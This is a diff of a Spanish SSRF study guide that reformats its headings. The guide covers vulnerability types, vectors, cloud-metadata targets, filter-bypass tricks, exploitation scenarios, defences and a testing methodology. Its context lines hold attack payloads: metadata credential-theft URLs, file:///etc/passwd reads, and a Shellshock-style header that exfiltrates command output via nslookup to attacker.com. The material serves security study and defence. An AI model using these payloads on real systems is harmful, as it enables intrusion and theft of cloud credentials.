@@ -1,10 +1,6 @@
----
-icon: folder-open
----
-
 # Server-side request forgery (SSRF)
 
-### 🔍 ¿Qué es SSRF?
+## 🔍 ¿Qué es SSRF?
 
 Server-Side Request Forgery (SSRF) es una vulnerabilidad que permite a un atacante provocar que la aplicación del lado del servidor realice solicitudes HTTP a un dominio arbitrario elegido por el atacante. Esto convierte efectivamente al servidor vulnerable en un proxy, permitiendo a los atacantes:
 
@@ -19,22 +15,22 @@ El problema principal es que la aplicación acepta URLs proporcionadas por el us
 
 ***
 
-### 🧩 Tipos de SSRF
+## 🧩 Tipos de SSRF
 
-#### 📡 SSRF Básico (In-Band):
+### 📡 SSRF Básico (In-Band):
 
 * La respuesta de la solicitud interna se devuelve al atacante
 * Visibilidad directa del contenido solicitado
 * Ejemplo: verificador de stock que obtiene datos de una API interna
 
-#### 🌫️ SSRF Ciego (Out-of-Band):
+### 🌫️ SSRF Ciego (Out-of-Band):
 
 * No se devuelve una respuesta directa al atacante
 * Se deben usar canales laterales para la detección (DNS, timing)
 * Más difícil de explotar pero aún peligroso
 * Ejemplo: cabecera Referer que provoca logging en el backend
 
-#### ⚠️ SSRF Semi-Ciego:
+### ⚠️ SSRF Semi-Ciego:
 
 * Respuesta parcial o indicadores indirectos
 * Mensajes de error que revelan éxito/fallo
@@ -43,9 +39,9 @@ El problema principal es que la aplicación acepta URLs proporcionadas por el us
 
 ***
 
-### 🛤️ Vectores comunes de SSRF
+## 🛤️ Vectores comunes de SSRF
 
-#### ➡️ Parámetros URL:
+### ➡️ Parámetros URL:
 
 ```http
 GET /product/stock?url=http://internal-api.local/admin
@@ -53,7 +49,7 @@ GET /fetch?url=http://169.254.169.254/latest/meta-data/
 POST /webhook&callback=http://attacker.com
 ```
 
-#### ➡️ Subida de archivos:
+### ➡️ Subida de archivos:
 
 ```xml
 <!-- SVG con entidad externa -->
@@ -62,21 +58,21 @@ POST /webhook&callback=http://attacker.com
 <svg>&xxe;</svg>
 ```
 
-#### ➡️ Generadores de PDF:
+### ➡️ Generadores de PDF:
 
 ```html
 <link rel="stylesheet" href="http://internal-api.local/admin">
 <img src="http://169.254.169.254/latest/meta-data/">
 ```
 
-#### ➡️ Cabeceras HTTP:
+### ➡️ Cabeceras HTTP:
 
 ```http
 Referer: http://internal-service.local
 X-Forwarded-For: http://internal-api
 ```
 
-#### ➡️ Funciones de Import/Export:
+### ➡️ Funciones de Import/Export:
 
 * Importación de datos desde URL
 * Exportación a webhook URL
@@ -85,9 +81,9 @@ X-Forwarded-For: http://internal-api
 
 ***
 
-### 🎯 Destinos objetivo
+## 🎯 Destinos objetivo
 
-#### 🏠 Localhost / Servicios internos:
+### 🏠 Localhost / Servicios internos:
 
 ```
 http://localhost/admin
@@ -97,7 +93,7 @@ http://0.0.0.0:8080/admin
 http://[::1]/admin
 ```
 
-#### 🌐 Red interna:
+### 🌐 Red interna:
 
 ```
 http://192.168.0.1/admin
@@ -106,7 +102,7 @@ http://172.16.0.1/admin
 http://internal-api.company.local
 ```
 
-#### ☁️ Metadatos de la nube:
+### ☁️ Metadatos de la nube:
 
 ```
 # AWS
@@ -124,7 +120,7 @@ http://169.254.169.254/metadata/instance?api-version=2021-02-01
 http://169.254.169.254/metadata/v1/
 ```
 
-#### 🔗 Servicios externos:
+### 🔗 Servicios externos:
 
 * Servidores controlados por el atacante para exfiltración de datos
 * Endpoints de webhook
@@ -132,9 +128,9 @@ http://169.254.169.254/metadata/v1/
 
 ***
 
-### 🚪 Técnicas de bypass de filtros
+## 🚪 Técnicas de bypass de filtros
 
-#### 🚫 Bypass de blacklist
+### 🚫 Bypass de blacklist
 
 ➡️ **Representaciones alternativas de IP:**
 
@@ -174,7 +170,7 @@ admin → %2561%2564%256d%2569%256e
 admin → &#97;&#100;&#109;&#105;&#110;
 ```
 
-#### 🧩 Bypass de whitelist
+### 🧩 Bypass de whitelist
 
 ➡️ **Confusión en parsing de URL:**
 
@@ -208,9 +204,9 @@ http://allowed-domain#@attacker.com
 
 ***
 
-### ⚔️ Escenarios de explotación
+## ⚔️ Escenarios de explotación
 
-#### 👑 Acceso a panel de admin:
+### 👑 Acceso a panel de admin:
 
 ```
 1. Encontrar vulnerabilidad SSRF
@@ -220,7 +216,7 @@ http://allowed-domain#@attacker.com
 5. Ejemplo: /admin/delete?username=victim
 ```
 
-#### ☁️ Robo de metadatos en la nube:
+### ☁️ Robo de metadatos en la nube:
 
 ```
 # AWS - Obtener credenciales IAM
@@ -238,7 +234,7 @@ Respuesta:
 }
 ```
 
-#### 📡 Escaneo de puertos interno:
+### 📡 Escaneo de puertos interno:
 
 ```
 http://internal-host:22
@@ -247,7 +243,7 @@ http://internal-host:3306
 http://internal-host:6379
 ```
 
-#### 🔌 Interacción con API interna:
+### 🔌 Interacción con API interna:
 
 ```http
 POST http://internal-api/users/create
@@ -257,7 +253,7 @@ POST http://internal-api/users/create
 }
 ```
 
-#### 📂 Acceso al sistema de archivos:
+### 📂 Acceso al sistema de archivos:
 
 ```
 file:///etc/passwd
@@ -267,21 +263,21 @@ file:///proc/self/environ
 
 ***
 
-### 🕵️ Detección de SSRF ciego
+## 🕵️ Detección de SSRF ciego
 
-#### 🌐 Detección basada en DNS:
+### 🌐 Detección basada en DNS:
 
 ```http
 Referer: http://unique-id.burpcollaborator.net
 ```
 
-#### ⏱️ Detección basada en tiempo:
+### ⏱️ Detección basada en tiempo:
 
 ```
 http://192.168.255.255
 ```
 
-#### ❌ Detección basada en errores:
+### ❌ Detección basada en errores:
 
 ```
 "Connection refused" → Puerto cerrado
@@ -290,7 +286,7 @@ http://192.168.255.255
 "Invalid response" → El servicio respondió
 ```
 
-#### 📤 Exfiltración Out-of-Band:
+### 📤 Exfiltración Out-of-Band:
 
 ```
 User-Agent: () { :; }; /usr/bin/nslookup $(whoami).attacker.com
@@ -304,28 +300,28 @@ peter.attacker.com
 
 ***
 
-### 💥 Impacto en el mundo real
+## 💥 Impacto en el mundo real
 
-#### Capital One (2019):
+### Capital One (2019):
 
 * SSRF al servicio de metadatos de AWS
 * Extracción de credenciales IAM
 * Acceso a buckets S3
 * Más de 100 millones de registros robados
 
-#### Uber (2016):
+### Uber (2016):
 
 * SSRF en herramientas internas
 * Acceso a servicios internos
 * Exfiltración de datos
 
-#### Google Cloud (2020):
+### Google Cloud (2020):
 
 * SSRF en Cloud Shell
 * Acceso al servicio de metadatos
 * Escalada de privilegios
 
-#### Bug Bounties:
+### Bug Bounties:
 
 * Acceso a paneles de admin internos
 * Robo de credenciales de bases de datos
@@ -334,9 +330,9 @@ peter.attacker.com
 
 ***
 
-### 🛡️ Estrategias de defensa
+## 🛡️ Estrategias de defensa
 
-#### ✅ Validación de entrada:
+### ✅ Validación de entrada:
 
 ```python
 ALLOWED_HOSTS = ['api.trusted-partner.com', 'cdn.example.com']
@@ -356,7 +352,7 @@ def is_internal_ip(ip):
     return False
 ```
 
-#### 📐 Parsing de URL:
+### 📐 Parsing de URL:
 
 ```python
 parsed_url = urlparse(user_url)
@@ -370,14 +366,14 @@ if is_internal_ip(ip):
     raise ValueError("IP interna bloqueada")
 ```
 
-#### 🧱 Segmentación de red:
+### 🧱 Segmentación de red:
 
 * Servidores en red aislada
 * Sin acceso directo a servicios internos
 * Uso de API gateway
 * Firewall bloqueando rangos internos
 
-#### 📜 Protocolos permitidos:
+### 📜 Protocolos permitidos:
 
 ```python
 allowed_schemes = ['http', 'https']
@@ -385,14 +381,14 @@ if parsed_url.scheme not in allowed_schemes:
     raise ValueError("Protocolo no permitido")
 ```
 
-#### 📋 Uso de whitelist:
+### 📋 Uso de whitelist:
 
 ```python
 if hostname not in TRUSTED_PARTNERS:
     deny()
 ```
 
-#### 🧹 Manejo de respuestas:
+### 🧹 Manejo de respuestas:
 
 ```python
 response = make_request(url)
@@ -402,9 +398,9 @@ return sanitized_data
 
 ***
 
-### 📋 Metodología de testing
+## 📋 Metodología de testing
 
-#### 🔎 Descubrimiento:
+### 🔎 Descubrimiento:
 
 * Encontrar todos los parámetros URL
 * Identificar funcionalidades webhook/callback
@@ -412,7 +408,7 @@ return sanitized_data
 * Comprobar subida de archivos (SVG, XML, HTML)
 * Probar cabeceras HTTP
 
-#### 🔥 Explotación:
+### 🔥 Explotación:
 
 ```
 http://localhost
@@ -433,7 +429,7 @@ http://10.0.0.1
 http://burpcollaborator.net
 ```
 
-#### 🧪 Bypass de filtros:
+### 🧪 Bypass de filtros:
 
 ```
 1. Formatos IP alternativos
@@ -443,7 +439,7 @@ http://burpcollaborator.net
 5. Confusión de parsing
 ```
 
-#### 🤖 Automatización:
+### 🤖 Automatización:
 
 ```
 - ssrfmap
